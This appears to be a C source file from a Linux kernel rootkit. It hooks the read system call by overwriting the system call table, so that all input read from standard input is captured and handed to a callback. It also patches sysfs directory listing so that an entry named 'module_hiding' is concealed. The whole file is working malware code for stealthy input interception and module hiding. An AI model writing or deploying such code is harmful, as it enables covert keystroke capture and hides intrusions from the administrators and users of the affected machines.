#include "global.h"
#include <linux/unistd.h>
#include <linux/fs.h>

typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
static fun_ssize_t_int_pvoid_size_t original_read;

typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);

fun_int_file_dirent_filldir_t original_sysfs_readdir;

typedef void (*fun_void_charp_int)(char *buf, int size);

static fun_void_charp_int callback_function;

filldir_t original_sysfs_filldir;

static asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;

    OUR_TRY_MODULE_GET;
    retval = original_read(fd, buf, count);

    if (retval > 0 && fd == 0){ // only handle this when we actually read something and only read from stdin (fd==0)
        callback_function(buf, retval);
        //printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
    }
    OUR_MODULE_PUT;
    return retval;
}

static void dummy_callback(char* buf, int size){
    OUR_DEBUG("unhandled input from stdin (no callback registered): %s", buf);
    //call this when no callback is specified
}

int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    if (hidden && strcmp(name, "module_hiding") == 0){
        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
        return 0;
    }
    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
    OUR_DEBUG("Hooked sysfs_readdir.\n");
    original_sysfs_filldir = filldir;
    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
}

/* Hooks the read system call. */
void hook_read(fun_void_charp_int cb){
    void** sys_call_table = (void *) ptr_sys_call_table;
    struct file_operations* sysfs_dir_ops;

    if(cb == 0){
        callback_function = dummy_callback;
    } else {
        callback_function = cb;
    }

    original_read = sys_call_table[__NR_read];
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    original_sysfs_readdir = sysfs_dir_ops->readdir;

    make_page_writable((long unsigned int) ptr_sys_call_table);
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
    sys_call_table[__NR_read] = (void*) hooked_read;
    make_page_readonly((long unsigned int) ptr_sys_call_table);
    make_page_readonly((long unsigned int) sysfs_dir_ops);

}

/* Hooks the read system call. */
void unhook_read(void){
    void** sys_call_table = (void *) ptr_sys_call_table;
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    make_page_writable((long unsigned int) ptr_sys_call_table);
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sys_call_table[__NR_read] = (void*) original_read;
    sysfs_dir_ops = (struct file_operations*) ptr_sysfs_dir_operations;
    sysfs_dir_ops->readdir = original_sysfs_readdir;
    make_page_readonly((long unsigned int) ptr_sys_call_table);
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}
